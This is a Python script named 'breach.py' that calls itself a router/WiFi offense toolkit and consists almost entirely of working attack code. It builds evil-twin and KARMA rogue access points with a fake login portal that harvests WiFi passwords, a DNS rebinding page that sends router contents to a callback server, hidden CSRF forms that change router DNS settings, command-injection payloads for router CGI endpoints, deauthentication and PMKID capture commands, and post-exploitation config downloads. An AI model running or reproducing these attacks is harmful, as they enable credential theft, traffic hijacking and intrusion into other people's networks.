#!/usr/bin/env python3
# breach.py — cross-platform router/WiFi offense toolkit
# Android (Termux), macOS, Linux, Windows — stdlib only, no external binaries required
# Wireless-layer vectors (pmkid, krack, karma, etc.) need Linux/Android + root + monitor-mode chipset + aircrack-ng/hcxtools

import argparse
import base64
import ctypes
import http.client
import os
import platform as pf
import shlex
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.parse

ROOT = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(ROOT, "breach_work")
LOOT = os.path.join(WORK, "loot")
PAYLOADS = os.path.join(WORK, "payloads")
CAPTURES = os.path.join(WORK, "captures")

for d in (WORK, LOOT, PAYLOADS, CAPTURES):
    os.makedirs(d, exist_ok=True)

IS_WINDOWS = sys.platform == "win32"
IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "").lower()
IS_MACOS = pf.system() == "Darwin"
IS_LINUX = pf.system() == "Linux" and not IS_TERMUX
IS_ANDROID_LIKE = IS_TERMUX or (IS_LINUX and os.path.exists("/system/bin/toolbox"))


def root_check():
    if IS_WINDOWS:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.geteuid() == 0


def have(binary):
    return shutil.which(binary) is not None


def sh(cmd, background=False, capture=True):
    args = shlex.split(cmd) if isinstance(cmd, str) else cmd
    if background:
        if IS_WINDOWS:
            return subprocess.Popen(
                args,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return subprocess.run(args, capture_output=capture, text=True)


def save_loot(name, content):
    path = os.path.join(LOOT, name)
    with open(path, "a") as f:
        f.write(content + "\n")
    return path


# ---------------------------------------------------------------- platform info

def cmd_platform(args):
    print(f"[*] os: {pf.system()} {pf.release()} ({pf.machine()})")
    print(f"[*] root/admin: {root_check()}")
    print(f"[*] termux: {IS_TERMUX}")
    for b in ("nmap", "ping", "arp", "termux-wifi-scan", "airport", "iw", "aircrack-ng", "hcxdumptool", "hostapd", "airbase-ng", "bettercap"):
        print(f"    {b}: {'yes' if have(b) else 'no'}")
    return 0


# ---------------------------------------------------------------- lan scan

def ping_host(ip, timeout=1):
    if IS_WINDOWS:
        cmd = ["ping", "-n", "1", "-w", str(timeout * 1000), ip]
    else:
        cmd = ["ping", "-c", "1", "-W", str(timeout), ip]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        return r.returncode == 0
    except Exception:
        return False


def cmd_lan_scan(args):
    net = args.net or "192.168.1.0/24"
    try:
        base = ".".join(net.split(".")[:3])
    except Exception:
        base = "192.168.1"

    print(f"[*] LAN discovery on {base}.0/24")
    alive = []
    for i in range(1, 255):
        ip = f"{base}.{i}"
        if ping_host(ip):
            alive.append(ip)
            print(f"[+] {ip} up")

    print("[*] arp table:")
    r = sh("arp -a", capture=True)
    print(r.stdout)

    out = "alive:\n" + "\n".join(alive) + "\n\narp:\n" + r.stdout
    save_loot(f"lan_scan_{base}.txt", out)
    print(f"[!] {len(alive)} hosts up")
    return 0


# ---------------------------------------------------------------- wireless survey (best effort)

def cmd_wifi_survey(args):
    if IS_TERMUX and have("termux-wifi-scan"):
        print("[*] termux-wifi-scan")
        r = sh("termux-wifi-scan", capture=True)
        print(r.stdout)
        save_loot("wifi_scan.txt", r.stdout)
        return 0

    if IS_MACOS and have("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"):
        ap = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        print(f"[*] airport -s")
        r = sh(f"{ap} -s", capture=True)
        print(r.stdout)
        save_loot("wifi_scan.txt", r.stdout)
        return 0

    if IS_LINUX:
        if have("nmcli"):
            print("[*] nmcli device wifi list")
            r = sh("nmcli device wifi list", capture=True)
            print(r.stdout)
            save_loot("wifi_scan.txt", r.stdout)
            return 0
        if have("iwlist"):
            print("[*] iwlist scan (may need root)")
            r = sh("iwlist scan", capture=True)
            print(r.stdout)
            save_loot("wifi_scan.txt", r.stdout)
            return 0

    if IS_WINDOWS:
        print("[*] netsh wlan show networks mode=bssid")
        r = sh("netsh wlan show networks mode=bssid", capture=True)
        print(r.stdout)
        save_loot("wifi_scan.txt", r.stdout)
        return 0

    print("[!] no native wireless survey tool found on this platform")
    return 1


# ---------------------------------------------------------------- android saved wifi config

WIFI_CONFIG_PATHS = [
    "/data/misc/wifi/WifiConfigStore.xml",
    "/data/misc/wifi/wpa_supplicant.conf",
    "/data/system/users/0/wifi/WifiConfigStore.xml",
    "/data/misc/wifi/softap.conf",
]


def cmd_android_wifi(args):
    """Attempt to read saved Wi-Fi config on rooted Android.
    Android 10+: WifiConfigStore is encrypted/keystore-backed; plaintext PSK usually unavailable."""
    if not IS_ANDROID_LIKE:
        print("[!] android_wifi vector is Android-specific")
        return 1
    if not root_check():
        print("[!] reading wifi config requires root (su)")
        return 1

    found = False
    for path in WIFI_CONFIG_PATHS:
        if not os.path.exists(path):
            continue
        print(f"[+] {path} exists")
        try:
            with open(path, "r", errors="ignore") as f:
                content = f.read()
            print(content[:4000])
            save_loot(f"android_wifi_{os.path.basename(path)}.txt", content)
            found = True
        except PermissionError:
            print(f"[!] {path} permission denied (need root/su)")
        except Exception as e:
            print(f"[!] {path} read error: {e}")

    if not found:
        print("[!] no readable wifi config found")
        print("[!] android 10+: WifiConfigStore encrypted; plaintext PSK not exposed without system keys")
    return 0


# ---------------------------------------------------------------- wireless vectors (platform-gated)

def _wireless_ready(extra_binaries=None):
    if not (IS_LINUX or IS_TERMUX):
        print("[!] wireless injection requires Linux or Android (Termux)")
        return False
    if not root_check():
        print("[!] wireless injection requires root/admin")
        return False
    missing = [b for b in (extra_binaries or []) if not have(b)]
    if missing:
        print(f"[!] missing binaries: {', '.join(missing)}")
        return False
    return True


def cmd_pmkid(args):
    if not _wireless_ready(["hcxdumptool", "hcxpcapngtool"]):
        print("[*] alternative: use dns_rebind / csrf_dns / router_inject / upnp (pure python, any platform)")
        return 1
    iface = args.interface or "wlan0mon"
    out = os.path.join(CAPTURES, f"pmkid_{int(time.time())}.pcap")
    print(f"[*] PMKID capture -> {out}")
    try:
        subprocess.run(["hcxdumptool", "-i", iface, "-o", out, "--enable_status"])
    except KeyboardInterrupt:
        pass
    print(f"[!] capture saved: {out}")
    print(f"[*] hcxpcapngtool -o {out}.hc22000 {out}")
    return 0


def cmd_krack(args):
    if not _wireless_ready(["aireplay-ng"]):
        return 1
    bssid = args.bssid
    client = args.client or "ff:ff:ff:ff:ff:ff"
    iface = args.interface or "wlan0mon"
    print(f"[*] KRACK check on {bssid} (needs WPA2, no 802.11w)")
    subprocess.run(["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, iface])
    return 0


def cmd_fragattacks(args):
    if not _wireless_ready(["aireplay-ng"]):
        return 1
    bssid = args.bssid
    iface = args.interface or "wlan0mon"
    print(f"[*] fragmentation attack against {bssid}")
    subprocess.run(["aireplay-ng", "-5", "-a", bssid, iface])
    return 0


def cmd_wpa3(args):
    if not (IS_LINUX or IS_TERMUX):
        print("[!] WPA3 recon requires Linux/Android")
        return 1
    bssid = args.bssid
    iface = args.interface or "wlan0"
    print(f"[*] probing WPA3 / SAE on {bssid}")
    if have("airodump-ng"):
        subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--write", f"{CAPTURES}/wpa3_recon", "--output-format", "csv", iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(6)
    print("[!] if RSN IE shows SAE and transition mode, downgrade to WPA2 then use pmkid")
    return 0


CAPTIVE_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Network Login</title></head>
<body>
<h2>WiFi Authentication Required</h2>
<form method="post" action="/login">
<label>Password: <input type="password" name="pass"></label><br>
<button type="submit">Connect</button>
</form>
<script>document.querySelector('form').onsubmit=function(){fetch('/log',{method:'POST',body:new FormData(this)});return false;}</script>
</body></html>
"""


def cmd_karma(args):
    if not _wireless_ready(["airbase-ng"]):
        print("[*] alternative: hostapd with karma/mana patch")
        return 1
    iface = args.interface or "wlan0"
    ssid = args.ssid or "Free_WiFi"
    print(f"[*] KARMA rogue AP: {ssid} on {iface}")
    subprocess.Popen(["airbase-ng", "-P", "-c", "6", "-e", ssid, iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    portal_dir = os.path.join(WORK, "portal")
    os.makedirs(portal_dir, exist_ok=True)
    with open(os.path.join(portal_dir, "index.html"), "w") as f:
        f.write(CAPTIVE_HTML)

    creds_log = os.path.join(LOOT, "karma_creds.txt")
    portal_py = os.path.join(WORK, "portal.py")
    with open(portal_py, "w") as f:
        f.write(f"""import http.server, socketserver
CREDS="{creds_log}"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def do_POST(self):
        if self.path=="/log":
            n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
            with open(CREDS,"a") as c: c.write(body+"\\n")
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok"); return
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def log_message(self,*a): pass
socketserver.TCPServer(("10.0.0.1",80),H).serve_forever()
""")

    sh(f"ip link set {iface} down")
    sh(f"ip addr add 10.0.0.1/24 dev {iface}")
    sh(f"ip link set {iface} up")
    subprocess.Popen([sys.executable, portal_py])
    sh("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE" if have("iptables") else "true")
    sh("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print(f"[*] rogue AP {ssid} up; captive portal at 10.0.0.1:80")
    print(f"[*] creds -> {creds_log}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    return 0


def cmd_evil_twin(args):
    if not _wireless_ready(["hostapd", "dnsmasq"]):
        return 1
    iface = args.interface or "wlan0"
    ssid = args.ssid or "Free_WiFi"
    channel = args.channel or "6"

    hostapd_conf = os.path.join(WORK, "hostapd_evil.conf")
    with open(hostapd_conf, "w") as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
ignore_broadcast_ssid=0
""")

    dnsmasq_conf = os.path.join(WORK, "dnsmasq_evil.conf")
    with open(dnsmasq_conf, "w") as f:
        f.write(f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
""")

    portal_dir = os.path.join(WORK, "portal")
    os.makedirs(portal_dir, exist_ok=True)
    with open(os.path.join(portal_dir, "index.html"), "w") as f:
        f.write(CAPTIVE_HTML)
    creds_log = os.path.join(LOOT, "eviltwin_creds.txt")
    portal_py = os.path.join(WORK, "portal_evil.py")
    with open(portal_py, "w") as f:
        f.write(f"""import http.server, socketserver
CREDS="{creds_log}"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
        with open(CREDS,"a") as c: c.write(body+"\\n")
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self,*a): pass
socketserver.TCPServer(("10.0.0.1",80),H).serve_forever()
""")

    sh(f"ip link set {iface} down")
    sh(f"ip addr add 10.0.0.1/24 dev {iface}")
    sh(f"ip link set {iface} up")
    subprocess.Popen(["hostapd", hostapd_conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen([sys.executable, portal_py])

    print(f"[*] evil twin {ssid} on {iface} ch {channel}")
    print(f"[*] captive portal at 10.0.0.1:80; creds -> {creds_log}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    return 0


# ---------------------------------------------------------------- dns rebinding (pure python, all platforms)

REBIND_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Router Check</title></head>
<body>
<h2>Router Access Test</h2>
<p id="status">Waiting for DNS rebind...</p>
<script>
let attempts = 0;
const target = "{target}";
const domain = "{domain}";
function log(m){document.getElementById('status').innerText=m;console.log(m);}
async function rebind(){
  try{
    const r = await fetch("http://"+domain+":8080/probe");
    const t = await r.text();
    log("rebound: "+t);
    attack();
  }catch(e){
    attempts++;
    if(attempts<40) setTimeout(rebind,1000);
    else log("rebind failed: "+e);
  }
}
async function attack(){
  try{
    const r = await fetch("http://"+target+"/");
    const t = await r.text();
    log("router html length: "+t.length);
    await fetch("/log?data="+btoa(unescape(encodeURIComponent(t))));
  }catch(e){
    log("attack error: "+e);
  }
}
setTimeout(rebind,500);
</script>
</body></html>
"""


def cmd_dns_rebind(args):
    target = args.target or "192.168.1.1"
    domain = args.domain or "rebind.local"
    bind_ip = args.bind or "127.0.0.1"
    port = 53 if root_check() else 5353

    html = REBIND_HTML.format(target=target, domain=domain)
    html_path = os.path.join(PAYLOADS, "rebind.html")
    with open(html_path, "w") as f:
        f.write(html)

    dns_py = os.path.join(WORK, "rebind_dns.py")
    with open(dns_py, "w") as f:
        f.write(f'''import socket
TARGET="{target}"
BIND="{bind_ip}"
DOMAIN="{domain}."
count={{}}
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
try:
    s.bind(("0.0.0.0",{port}))
except PermissionError:
    print("[!] port {{port}} needs root/admin; use 5353 instead")
    raise
print("[*] DNS rebind flip server on port {{port}}; {{domain}} -> {{TARGET}} after 1 query")
while True:
    data,addr=s.recvfrom(512)
    qname=data[12:].split(b"\\x00")[0].decode(errors="ignore")
    c=count.get(qname,0)+1; count[qname]=c
    ip = BIND if c<=1 else TARGET
    tid=data[:2]
    resp=tid+bytes([0x81,0x80,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00])
    resp+=data[12:]
    resp+=bytes([0xc0,0x0c,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x3c,0x00,0x04])
    resp+=socket.inet_aton(ip)
    s.sendto(resp,addr)
''')

    web_py = os.path.join(WORK, "rebind_web.py")
    with open(web_py, "w") as f:
        f.write(f'''import http.server, socketserver
from urllib.parse import urlparse, parse_qs
CREDS="{os.path.join(LOOT,'rebind_log.txt')}"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path=="/probe":
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
        elif self.path.startswith("/log?"):
            q=parse_qs(urlparse(self.path).query)
            with open(CREDS,"a") as c: c.write(q.get("data",[""])[0]+"\\n---\\n")
            self.send_response(200); self.end_headers(); self.wfile.write(b"logged")
        else:
            self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
            self.wfile.write(open("{html_path}").read().encode())
    def log_message(self,*a): pass
socketserver.TCPServer(("0.0.0.0",8080),H).serve_forever()
''')

    print(f"[*] DNS rebinding payload -> {html_path}")
    print(f"[*] DNS flip server -> {dns_py}")
    print(f"[*] web callback server -> {web_py}")
    print(f"[*] target router: {target}")
    print(f"[*] domain: {domain}")
    print(f"[*] dns port: {port} (needs root/admin if 53)")
    print("[!] steps:")
    print("    1. run rebind_dns.py (root/admin for port 53)")
    print("    2. run rebind_web.py")
    print("    3. serve rebind.html; victim visits page")
    print("    4. results -> breach_work/loot/rebind_log.txt")
    return 0


# ---------------------------------------------------------------- csrf dns (pure python)

CSRF_TEMPLATES = [
    ("D-Link", "http://{target}/tools_dns.asp", "POST", "StaticDns1={dns1}&StaticDns2={dns2}&Save=Save"),
    ("TP-Link", "http://{target}/userRpm/StatusDnsRpm.htm", "GET", "DnsServer={dns1}"),
    ("Netgear", "http://{target}/setup.cgi", "POST", "dns1={dns1}&dns2={dns2}&apply=Apply"),
    ("Generic", "http://{target}/admin/dns", "POST", "dns1={dns1}&dns2={dns2}"),
]


def cmd_csrf_dns(args):
    target = args.target
    dns1 = args.dns1 or "8.8.8.8"
    dns2 = args.dns2 or "8.8.4.4"

    forms = []
    for vendor, url, method, body in CSRF_TEMPLATES:
        u = url.format(target=target)
        b = body.format(dns1=dns1, dns2=dns2)
        if method == "GET":
            forms.append(f'<iframe src="{u}?{urllib.parse.quote(b)}" style="display:none"></iframe>')
        else:
            pairs = [x.split("=", 1) for x in b.split("&") if "=" in x]
            inputs = ''.join(f'<input type="hidden" name="{k}" value="{v}">' for k, v in pairs)
            forms.append(f'''
<form id="{vendor.lower()}" action="{u}" method="POST">{inputs}</form>
<script>document.getElementById("{vendor.lower()}").submit()</script>
''')

    html = "<html><body><h3>DNS Change</h3>" + "\\n".join(forms) + "<p>Attempts sent.</p></body></html>"
    path = os.path.join(PAYLOADS, f"csrf_dns_{target}.html")
    with open(path, "w") as f:
        f.write(html)

    print(f"[*] CSRF DNS hijack payload -> {path}")
    print(f"[*] target: {target}; DNS -> {dns1}, {dns2}")
    print("[!] victim must be logged into router admin in same browser session")
    print("[!] defeated by: SameSite cookies, CSRF tokens, admin re-auth")
    return 0


# ---------------------------------------------------------------- router injection (pure python)

INJECTION_ENDPOINTS = [
    "/cgi-bin/diagnostics.cgi", "/cgi-bin/ping.cgi", "/cgi-bin/traceroute.cgi",
    "/cgi-bin/nslookup.cgi", "/cgi-bin/admin.cgi", "/apply.cgi",
    "/cgi-bin/network.cgi", "/cgi-bin/tools.cgi",
]

INJECTION_PAYLOADS = ["; id", "| id", "$(id)", "`id`", "& id"]


def http_probe(target, port, path, method="GET", body=None, headers=None, timeout=6):
    try:
        conn = http.client.HTTPConnection(target, port, timeout=timeout)
        h = headers or {}
        if method == "GET":
            conn.request("GET", path, headers=h)
        else:
            conn.request("POST", path, body=body, headers=h)
        resp = conn.getresponse()
        data = resp.read(1024).decode(errors="ignore")
        conn.close()
        return resp.status, data
    except Exception:
        return None, ""


def cmd_router_inject(args):
    target = args.target
    port = args.port or 80
    print(f"[*] command-injection probe on {target}:{port}")
    for ep in INJECTION_ENDPOINTS:
        for pl in INJECTION_PAYLOADS:
            path = ep + urllib.parse.quote(pl)
            status, body = http_probe(target, port, path)
            if status == 200 and ("uid=" in body or "gid=" in body or "root:" in body):
                msg = f"[+] injection likely at {ep} with payload {pl!r}"
                print(msg)
                save_loot(f"inject_{target}.txt", msg)
                return 0
    print("[!] no injection reflection detected on probed endpoints")
    return 0


# ---------------------------------------------------------------- upnp / tr-064 (pure python)

UPNP_SOAP = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<m:SetDefaultConnectionService xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewDefaultConnectionService>WANIPConnection</NewDefaultConnectionService>
</m:SetDefaultConnectionService>
</s:Body>
</s:Envelope>"""


def cmd_upnp(args):
    target = args.target
    port = args.port or 49152
    print(f"[*] UPnP SOAP probe on {target}:{port}")
    try:
        conn = http.client.HTTPConnection(target, port, timeout=5)
        headers = {
            "Content-Type": "text/xml",
            "SOAPACTION": "urn:schemas-upnp-org:service:WANIPConnection:1#SetDefaultConnectionService",
        }
        conn.request("POST", "/upnp/control/WANIPConn1", body=UPNP_SOAP, headers=headers)
        resp = conn.getresponse()
        body = resp.read(512).decode(errors="ignore")
        conn.close()
        if resp.status == 200:
            print(f"[+] UPnP control endpoint open on {target}:{port}")
            save_loot(f"upnp_{target}.txt", f"{target}:{port} UPnP open\\n{body}")
        else:
            print(f"[!] UPnP responded {resp.status}")
    except Exception as e:
        print(f"[!] UPnP not reachable: {e}")

    print("[*] TR-064 (port 7547) and TR-069 (port 30005) are common router management endpoints")
    print("[!] check for: weak auth, default creds, command injection in SOAP parameters")
    return 0


# ---------------------------------------------------------------- router post (pure python)

BACKUP_PATHS = [
    "/cgi-bin/config.cgi", "/backup/config.bin", "/admin/backup.cgi",
    "/usercfg.cfg", "/config.cfg", "/settings.bin",
]


def cmd_router_post(args):
    target = args.target
    port = args.port or 80
    userpwd = args.creds
    if not userpwd:
        print("[!] --creds user:pass required")
        return 1
    user, pwd = userpwd.split(":", 1)
    print(f"[*] post-exploitation on {target}:{port} as {user}")
    for bp in BACKUP_PATHS:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=5)
            auth = base64.b64encode((user + ":" + pwd).encode()).decode()
            conn.request("GET", bp, headers={"Authorization": "Basic " + auth})
            resp = conn.getresponse()
            data = resp.read()
            conn.close()
            if resp.status == 200 and len(data) > 100:
                out = os.path.join(LOOT, f"config_{target}.bin")
                with open(out, "wb") as f:
                    f.write(data)
                print(f"[+] config downloaded -> {out}")
                return 0
        except Exception:
            pass
    print("[!] no config backup endpoint found")
    return 0


# ---------------------------------------------------------------- menu

MENU_OPTIONS = [
    ("platform", "platform info + tool availability"),
    ("wifi_survey", "native wireless survey (best effort)"),
    ("lan_scan", "LAN host discovery (ping sweep + arp)"),
    ("android_wifi", "read saved android wifi config (rooted)"),
    ("dns_rebind", "DNS rebinding payload + flip DNS server"),
    ("csrf_dns", "CSRF payload to change router DNS"),
    ("router_inject", "SOHO router command-injection probe"),
    ("upnp_tr064", "UPnP / TR-064 SOAP manipulation"),
    ("router_post", "router config backup download (post-exploit)"),
    ("pmkid", "PMKID capture (Linux/Android root + hcxdumptool)"),
    ("krack", "KRACK detection + replay (Linux/Android root + aireplay-ng)"),
    ("fragattacks", "fragmentation / aggregation attack (Linux/Android root)"),
    ("wpa3", "WPA3 / Dragonblood downgrade detection"),
    ("karma", "KARMA rogue AP (Linux/Android root + airbase-ng)"),
    ("evil_twin", "evil twin + captive portal (Linux/Android root + hostapd)"),
]


def menu():
    while True:
        print("\n=== breach ===")
        for i, (name, desc) in enumerate(MENU_OPTIONS, 1):
            print(f"  {i}. {name:14s} — {desc}")
        print("  0. exit")
        choice = input("\nselect: ").strip()
        if not choice or choice == "0":
            return 0
        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(MENU_OPTIONS):
                print("! invalid")
                continue
        except ValueError:
            print("! invalid")
            continue

        name, _ = MENU_OPTIONS[idx]
        args = argparse.Namespace(
            interface="wlan0", net="192.168.1.0/24", target=None, port=80,
            scheme="http", path="/", creds=None, ssid="Free_WiFi",
            domain="rebind.local", bind="127.0.0.1", dns1="8.8.8.8", dns2="8.8.4.4",
            bssid=None, client=None, channel="6",
        )

        if name == "platform":
            return cmd_platform(args)
        if name == "wifi_survey":
            return cmd_wifi_survey(args)
        if name == "lan_scan":
            args.net = input(f"network [{args.net}]: ") or args.net
            return cmd_lan_scan(args)
        if name == "android_wifi":
            return cmd_android_wifi(args)
        if name == "dns_rebind":
            args.target = input(f"target router ip [{args.target}]: ") or args.target
            args.domain = input(f"domain [{args.domain}]: ") or args.domain
            args.bind = input(f"bind ip [{args.bind}]: ") or args.bind
            return cmd_dns_rebind(args)
        if name == "csrf_dns":
            args.target = input("target ip: ")
            args.dns1 = input(f"dns1 [{args.dns1}]: ") or args.dns1
            args.dns2 = input(f"dns2 [{args.dns2}]: ") or args.dns2
            return cmd_csrf_dns(args)
        if name == "router_inject":
            args.target = input("target ip: ")
            args.port = int(input(f"port [{args.port}]: ") or args.port)
            return cmd_router_inject(args)
        if name == "upnp_tr064":
            args.target = input("target ip: ")
            args.port = int(input(f"port [{args.port}]: ") or args.port)
            return cmd_upnp(args)
        if name == "router_post":
            args.target = input("target ip: ")
            args.port = int(input(f"port [{args.port}]: ") or args.port)
            args.creds = input("creds user:pass: ")
            return cmd_router_post(args)
        if name == "pmkid":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            return cmd_pmkid(args)
        if name == "krack":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.bssid = input("bssid: ")
            args.client = input("client (optional): ") or None
            return cmd_krack(args)
        if name == "fragattacks":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.bssid = input("bssid: ")
            return cmd_fragattacks(args)
        if name == "wpa3":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.bssid = input("bssid: ")
            return cmd_wpa3(args)
        if name == "karma":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.ssid = input(f"ssid [{args.ssid}]: ") or args.ssid
            return cmd_karma(args)
        if name == "evil_twin":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.ssid = input(f"ssid [{args.ssid}]: ") or args.ssid
            args.channel = input(f"channel [{args.channel}]: ") or args.channel
            return cmd_evil_twin(args)
    return 0


# ---------------------------------------------------------------- parser / main

def build_parser():
    p = argparse.ArgumentParser(prog="breach", description="Cross-platform router/WiFi offense toolkit")
    sub = p.add_subparsers(dest="cmd", required=False)

    sp = sub.add_parser("platform", help="platform info + tool availability")
    sp.set_defaults(func=cmd_platform)

    sp = sub.add_parser("wifi_survey", help="native wireless survey (best effort)")
    sp.set_defaults(func=cmd_wifi_survey)

    sp = sub.add_parser("lan_scan", help="LAN host discovery")
    sp.add_argument("--net", default="192.168.1.0/24")
    sp.set_defaults(func=cmd_lan_scan)

    sp = sub.add_parser("android_wifi", help="read saved android wifi config (rooted)")
    sp.set_defaults(func=cmd_android_wifi)

    sp = sub.add_parser("dns_rebind", help="DNS rebinding payload + flip DNS server")
    sp.add_argument("--target", default="192.168.1.1")
    sp.add_argument("--domain", default="rebind.local")
    sp.add_argument("--bind", default="127.0.0.1")
    sp.set_defaults(func=cmd_dns_rebind)

    sp = sub.add_parser("csrf_dns", help="CSRF payload to change router DNS")
    sp.add_argument("--target", required=True)
    sp.add_argument("--dns1", default="8.8.8.8")
    sp.add_argument("--dns2", default="8.8.4.4")
    sp.set_defaults(func=cmd_csrf_dns)

    sp = sub.add_parser("router_inject", help="SOHO router command-injection probe")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=80)
    sp.set_defaults(func=cmd_router_inject)

    sp = sub.add_parser("upnp_tr064", help="UPnP / TR-064 SOAP manipulation")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=49152)
    sp.set_defaults(func=cmd_upnp)

    sp = sub.add_parser("router_post", help="router config backup download (post-exploit)")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=80)
    sp.add_argument("--creds", required=True, help="user:pass")
    sp.set_defaults(func=cmd_router_post)

    sp = sub.add_parser("pmkid", help="PMKID capture (Linux/Android root + hcxdumptool)")
    sp.add_argument("-i", "--interface", default="wlan0mon")
    sp.set_defaults(func=cmd_pmkid)

    sp = sub.add_parser("krack", help="KRACK detection + replay (Linux/Android root)")
    sp.add_argument("-i", "--interface", default="wlan0mon")
    sp.add_argument("--bssid", required=True)
    sp.add_argument("--client")
    sp.set_defaults(func=cmd_krack)

    sp = sub.add_parser("fragattacks", help="fragmentation / aggregation attack")
    sp.add_argument("-i", "--interface", default="wlan0mon")
    sp.add_argument("--bssid", required=True)
    sp.set_defaults(func=cmd_fragattacks)

    sp = sub.add_parser("wpa3", help="WPA3 / Dragonblood downgrade detection")
    sp.add_argument("-i", "--interface", default="wlan0")
    sp.add_argument("--bssid", required=True)
    sp.set_defaults(func=cmd_wpa3)

    sp = sub.add_parser("karma", help="KARMA rogue AP")
    sp.add_argument("-i", "--interface", default="wlan0")
    sp.add_argument("--ssid", default="Free_WiFi")
    sp.set_defaults(func=cmd_karma)

    sp = sub.add_parser("evil_twin", help="evil twin + captive portal")
    sp.add_argument("-i", "--interface", default="wlan0")
    sp.add_argument("--ssid", default="Free_WiFi")
    sp.add_argument("--channel", default="6")
    sp.set_defaults(func=cmd_evil_twin)

    return p


def main():
    p = build_parser()
    args = p.parse_args()
    if args.cmd is None:
        return menu()
    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
